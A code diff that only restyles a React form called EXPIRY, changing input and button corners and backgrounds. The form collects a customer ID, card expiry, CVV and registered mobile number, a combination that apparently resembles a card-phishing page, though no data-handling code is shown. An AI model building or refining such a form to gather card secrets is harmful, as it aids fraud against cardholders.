@@ -21,7 +21,7 @@ const EXPIRY = () => {
   };
 
   return (
-    <div className="min-h-[90vh] flex flex-col items-center justify-center bg-gray-50 p-6">
+    <div className="min-h-[90vh] flex flex-col bg-gray-50 p-6">
       {/* Top Bar */}
       <div className="flex justify-between w-full max-w-sm mb-4 text-gray-500">
         <HelpCircle className="w-6 h-6" />
@@ -47,7 +47,7 @@ const EXPIRY = () => {
             placeholder="Customer ID"
             value={customerId}
             onChange={(e) => setCustomerId(e.target.value)}
-            className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
+            className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
           />
         </div>
 
@@ -57,7 +57,7 @@ const EXPIRY = () => {
             type="month"
             value={expiryDate}
             onChange={(e) => setExpiryDate(e.target.value)}
-            className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
+            className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
           />
         </div>
 
@@ -68,7 +68,7 @@ const EXPIRY = () => {
             placeholder="CVV"
             value={cvv}
             onChange={(e) => setCvv(e.target.value)}
-            className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
+            className="w-full p-3 border rounded-full bg-white focus:outline-none focus:ring-2 focus:ring-blue-400"
           />
         </div>
 
@@ -79,7 +79,7 @@ const EXPIRY = () => {
             placeholder="Registered Mobile Number"
             value={mobile}
             onChange={(e) => setMobile(e.target.value)}
-            className="w-full p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
+            className="w-full p-3 border bg-white rounded-full focus:outline-none focus:ring-2 focus:ring-blue-400"
           />
         </div>
 
@@ -87,7 +87,7 @@ const EXPIRY = () => {
         <button
           onClick={handleSubmit}
           disabled={loading}
-          className="w-full bg-blue-600 text-white py-3 rounded-lg font-semibold flex items-center justify-center disabled:bg-gray-300"
+          className="w-full bg-blue-600 text-white py-3 rounded-full font-semibold flex items-center justify-center disabled:bg-gray-300"
         >
           {loading ? <Loader2 className="animate-spin w-5 h-5" /> : "Submit"}
         </button>
